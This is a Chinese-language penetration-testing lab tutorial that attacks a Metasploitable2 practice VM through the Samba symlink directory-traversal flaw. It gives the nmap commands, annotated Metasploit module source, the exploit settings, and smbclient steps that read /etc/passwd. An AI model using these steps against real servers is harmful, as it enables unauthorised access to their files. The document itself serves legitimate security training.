# Samba 漏洞攻击 Linux 服务器

## 一、实验简介

### 1.1 实验介绍

本实验将带领大家，使用 Samba 漏洞，对 Metasploitable2 这个目标靶机进一次完整的攻击。在实验过程中，每一个步骤，都有相应的截图。希望学习本实验的同学，能够掌握 Samba 漏洞的工具。

**注意：实验用的云主机因为配置成本较高，会限制次数，每个实验不超过6次**

### 1.2 实验知识点

本实验中我们尝试使用 Kali Linux 进行一次完整的渗透攻击。在这个实验中，将会涉及到的知识点有：

- Linux 基本操作命令
- Nmap 扫描漏洞操作
- 对扫描的 Samba 漏洞进行分析
- 模块 symlink_traversal 核心代码讲解
- 利用网络文件共享登录目标主机


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480577379137.png-wm)



### 1.3 实验环境

实验楼采用的实验环境包含两台虚拟机，分别是攻击机和靶机：

攻击机：Kali Linux 2.0 虚拟机，主机名是 kali，IP 地址为 192.168.122.101，默认用户名密码为 root/toor
靶机：Metasploitable2 虚拟机，主机名是 target，IP 地址为 192.168.122.102，默认用户密码为 msfadmin/msfadmin

本实验在实验楼的环境下进行。在实验楼的环境中，采用的实验环境包含两台虚拟机，分别是攻击机和靶机，攻击机和靶机的账户和密码参数分别如下：

| 主机   | 主机名            | 用户名     | 密码       |
| ------ | ----------------- | ---------- | ---------- |
| 攻击机 | `Kali Linux 2.0`  | `root`     | `toor`     |
| 靶机   | `Metasploitable2` | `msfadmin` | `msfadmin` |


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/ff207c4ac994ae597a753f238bd6b2de/1479811009892.png-wm)

## 二、环境启动

### 2.1 实验环境启动

首先在实验楼的环境中，启动 Kali Linux 虚拟机操作系统，在终端中输入如下命令，其中，在输入启动命令的时候，一定要注意，`root@Kali` 中的 K 是`大写`的 K：

```
# 开启 Kali 虚拟机
sudo virsh start Kali

# 注意，Kali 中 K 为大写字母
ssh root@Kali
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101382249.png-wm)

`Kali` 的登录密码为 `toor`。**注意：等 Kali 启动，输入命令后，要等待一段时间，再对 Kali 进行连接，否则会报错。** 登录成功后，如图所示：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1481101646711.png-wm)

在开启了目标 Kali Linux 虚拟机主机后，接着打开宿主机 Ubuntu 的命令行终端，输入命令打开目标靶机：

```
# 启动目标靶机
sudo virsh start Metasploitable2
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483504872990.png-wm)


## 三、 扫描漏目标主机漏洞

### 3.1 扫描目标主机漏洞

同之前的几个实验一样，首先我们在实验楼 Kali 环境中，登录 MSF 终端：

```
service postgresql start
sudo msfconsole
```

收集目标主机信息，是渗透测试的第一个步骤，使用 Namp 对目标主机进行扫描，查找主机漏洞，扫描的结果我们存入到文件 `/tmp/report.txt` 中，输入如下命令：

```
nmap -p 1-1000 -T4 -A -v target >/tmp/report.txt
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479881719755.png-wm)


这里我们使用到的参数意义如下：

| 参数               | 参数含义                                                     |
| ------------------ | ------------------------------------------------------------ |
| `-p`               | 指定扫描的端口范围                                           |
| `-T4`              | 设定 nmap 扫描的时间策略，数字为0-6，越大越快。扫描的越慢则越不容易被发现，也不会给目标带来太大的网络流量 |
| `-A`               | 同时启用操作系统指纹识别和版本检测                           |
| `-v`               | 将会显示扫描过程中的详细信息                                 |
| `>/tmp/report.txt` | 将输出的信息重定向到文件中，方便后续对扫描信息进行分析       |


上面的这个过程，可能有点久，因为扫描的端口比较多，信息收集得比较全面，所以请大家耐心等待一到两分钟。

当扫描结束后，我们使用 `cat`，命令查看文件内容，在实验楼 Kali 终端中输入：

```
cat /tmp/report.txt
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479881893327.png-wm)

接着可以在文本信息中看到这么一段信息：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479881973101.png-wm)

由图可以看到 139 端口和 445 端口的 `Samba` 服务的相关信息：

```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)

```

### 3.2 分析 Samba 漏洞

Samba，是种用来让 UNIX 系列的操作系统与微软 Windows 操作系统的 SMB/CIFS（Server Message Block/Common Internet File System）网络协议做链接的自由软件。第三版不仅可访问及分享 SMB 的文件夹及打印机，本身还可以集成入 Windows Server 的网域，扮演为网域控制站（Domain Controller）以及加入 Active Directory 成员。简而言之，此软件在 Windows 与 UNIX 系列 OS 之间搭起一座桥梁，让两者的资源可互通有无。

Samba 的应用范围非常广泛，因此漏洞的影响面也非常之大。Samba 能够为选定的 Unix 目录（包括所有子目录）创建网络共享。该功能使得 Windows 用户可以像访问普通 Windows 下的文件夹那样来通过网络访问这些 Unix 目录。


本实验所用的漏洞索引为：

> [OSVDB-62145](https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal#)

实验中，我们对 samba 模块使用的源码索引为：

> [symlink_traversal.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/admin/smb/samba_symlink_traversal.rb)

对核心代码进行讲解：

```
   # 模块初始化信息，包含作者信息，模块信息介绍
  def initialize
    super(
      'Name'        => 'Samba Symlink Directory Traversal',
      'Description' => %Q{
        This module exploits a directory traversal flaw in the Samba
      CIFS server. To exploit this flaw, a writeable share must be specified.
      The newly created directory will link to the root filesystem.
      },
      'Author'      =>
        [
          'kcope', # http://lists.grok.org.uk/pipermail/full-disclosure/2010-February/072927.html
          'hdm'    # metasploit module
        ],
      'References'  =>
        [
          ['OSVDB', '62145'],
          ['URL', 'http://www.samba.org/samba/news/symlink_attack.html']
        ],
      'License'     => MSF_LICENSE
    )

    # 注册信息选项
    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server']),
      OptString.new('SMBTARGET', [true, 'The name of the directory that should point to the root filesystem', 'rootfs'])
    ], self.class)

  end
  
  
  # 程序主要的运行函数
  def run
  
    # 程序连接服务器函数
    print_status("Connecting to the server...")
    connect()
    smb_login()

    
    # 连接目标主机    
    print_status("Trying to mount writeable share '#{datastore['SMBSHARE']}'...")
    self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

    # 尝试进入 root filesystem 文件系统
    print_status("Trying to link '#{datastore['SMBTARGET']}' to the root filesystem...")
    self.simple.client.symlink(datastore['SMBTARGET'], "../" * 10)

    # 进入成功后，在屏幕上输入成功标志
    print_status("Now access the following share to browse the root filesystem:")
    print_status("\t\\\\#{rhost}\\#{datastore['SMBSHARE']}\\#{datastore['SMBTARGET']}\\")
    print_line("")
  end

end 
  

```

代码关键模块讲解结束后，我们在 MSF 终端中，进行实战，输入如下命令：

```
search samba
```

![此处输入图片的描述](https://doc.shiyanlou.com/document-uid212008labid2296timestamp1480572764316.png/wm)


注意：这一步在实验楼中使用 `search samba` 会花较长的时间，同学们可以直接看老师搜索出来的结果，跳过这一步不会影响实验，造成缓慢的主要原因是因为没有进行缓存。解决的办法是使用缓存命令 `db_rebuild_cache` 进行缓存，提高索引速度：


```
# 使用 samba_symlink_traversal 模块

use auxiliary/admin/smb/samba_symlink_traversal 

# 查看参数

show options
         
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480572977733.png-wm)



输入命令，设置必要参数：

```
# 设置攻击主机

set RHOST 192.168.122.102

# 选择共享目录

set SMBSHARE tmp

```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480573418642.png-wm)

注意：再次提醒一下，Samba 的该漏洞危害是能够为选定的 Unix 目录（包括所有子目录）创建网络共享。

## 四、漏洞攻击

在各项参数设定完成之后，我们进行漏洞攻击：

```
# 进行漏洞攻击，samba 的该漏洞是创建网络共享

exploit 
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480573539217.png-wm)

其中如下信息，表示进入成功：

```
[*] 192.168.122.102:445 - Now access the following share to browse the root filesystem:

```
在成功之后，输入退出命令 `exit`，我们在终端中进行测试是否能够利用 `smbclient `进行连接，在连接之后，会出现输入密码，无需输入，按回车键即可：

```
exit 

smbclient //192.168.122.102/tmp
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480573933783.png-wm)

```
cd rootfs

cd etc

more passwd

```
即可看到 `/etc/passwd` 文件内容：

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
[....]
```
至此，实验成功，成功利用选定的 Unix 目录（包括所有子目录）创建网络共享。并通过登录到渗透的目标主机进行验证。

## 五、总结

Samba 漏洞攻击 Linux 服务器实验介绍了 Metasploitable2 中的 samba 漏洞。在该实验并带领大家，通过最原始的步骤，对目标靶机中的漏洞进行了渗透攻击，接着使用 网络共享，登录到所渗透的目标主机。对于常规的操作流程，希望同学们多加练习。在本次实验的学习中，我们涉及到的知识点为：

- Linux 基本操作命令
- Nmap 扫描漏洞操作
- 对扫描的 Samba 漏洞进行分析
- 模块 symlink_traversal 核心代码讲解
- 利用网络文件共享登录目标主机


## 六、推荐阅读

本次实验中，我们对利用选定的 Unix 目录创建网络共享，进行了实践操作。下面给大家介绍一些关于 Samba 漏洞的参考文档，希望同学们在业余时间中，多加练习，加深对渗透攻击的理解。下面是 Samba 的推荐阅读地址：

> http://blog.knownsec.com/2015/05/samba-3-0-37-enumprinters-memory-corruption/


## 七、课后作业

学习的同时，还需要用课后作业巩固知识点。在学习了本实验之后，希望同学们能够完成如下课后作业：

- 练习 Nmap 扫描器用法
- 思考 Samba 模块的攻击流程中 Nmap 的角色作用？
- 思考是否规定的文件夹，一定是 `tmp` 文件夹？
- 阅读推荐阅读材料（可选）

对于不懂的问题，都可随时在[实验楼问答](https://www.shiyanlou.com/questions)中提出，与老师和同学一起交流。